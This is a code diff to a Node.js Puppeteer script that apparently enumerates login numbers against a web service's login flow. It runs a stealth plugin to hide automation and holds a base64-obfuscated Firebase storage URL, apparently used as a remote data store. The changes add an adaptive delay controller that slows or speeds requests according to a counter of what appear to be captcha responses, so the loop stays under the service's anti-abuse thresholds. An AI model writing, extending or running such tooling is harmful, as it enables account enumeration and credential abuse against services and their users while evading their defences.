@@ -4,16 +4,63 @@ const puppeteer = require('puppeteer-extra')
 
 let USER = process.argv.slice(2)[0]
 
-let mAutoDelay = 1000
 let mConfig = null
 let mLoaded = false
 let page = null
+let mAutoDelay = 0
 let mPendingData = {}
 let mFinishData = 0
+let mCapture = 0
 let mStart = Date.now()
 let isFirstRequest = true
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
+
+
+class AdaptiveDelay {
+    constructor({minDelay = 1000, maxDelay = 1200, step = 100, incCooldown = 5000, decCooldown = 30000 } = {}) {
+        this.delay = minDelay
+        this.minDelay = minDelay
+        this.maxDelay = maxDelay
+        this.step = step
+
+        this.incCooldown = incCooldown
+        this.decCooldown = decCooldown
+
+        this.lastIncTime = 0
+        this.lastDecTime = 0
+
+        this.lastSignalCount = 0
+        this.lastSignalTime = 0
+    }
+
+    update(signalCount) {
+        let now = Date.now()
+
+        if (signalCount > this.lastSignalCount) {
+            if (now - this.lastIncTime < this.incCooldown) {
+                return this.delay
+            }
+
+            this.delay = Math.min(this.delay + this.step, this.maxDelay)
+            this.lastIncTime = now
+        } else {
+            if (now - this.lastDecTime < this.decCooldown) {
+                return this.delay
+            }
+
+            this.delay = Math.max(this.delay - this.step, this.minDelay)
+            this.lastDecTime = now
+        }
+
+        this.lastSignalCount = signalCount
+        this.lastSignalTime = now
+
+        return this.delay
+    }
+}
+
+const controller = new AdaptiveDelay()
 
 puppeteer.use(StealthPlugin())
 
@@ -30,14 +77,17 @@ process.on('message', async (data) => {
     } catch (error) {}
 })
 
-setInterval(async () => {
-    await pageReload()
-}, 3600000)
 
 startBrowser()
 
 
+setInterval(async () => {
+    await pageReload()
+}, 3600000)
+
+
 async function startBrowser() {
+    mAutoDelay = controller.update(mCapture)
     console.log('Delay:', mAutoDelay)
     
     try {
@@ -99,9 +149,12 @@ async function startBrowser() {
 
 
 async function foundLoginNumber() {
+    let delayPrev = mAutoDelay
+
     while (true) {
         if (mConfig) {
             mStart = Date.now()
+            
             try {
                 let prev = mConfig.n
                 let target = mConfig.s
@@ -124,6 +177,13 @@ async function foundLoginNumber() {
                     }
 
                     await setLoginRequest(number.toString())
+
+                    mAutoDelay = controller.update(mCapture)
+
+                    if (delayPrev != mAutoDelay) {
+                        delayPrev = mAutoDelay
+                        console.log('Delay Updated:', mAutoDelay)
+                    }
 
                     await delay(Math.min(mConfig.d, 2000))
                 }
@@ -245,6 +305,7 @@ async function loginDataProcess(page, url, reqHeaders, postData) {
                     }
                 } else if (value[18] && value[18][0]) {
                     status = 5
+                    mCapture++
                 } else {
                     status = 4
                 }
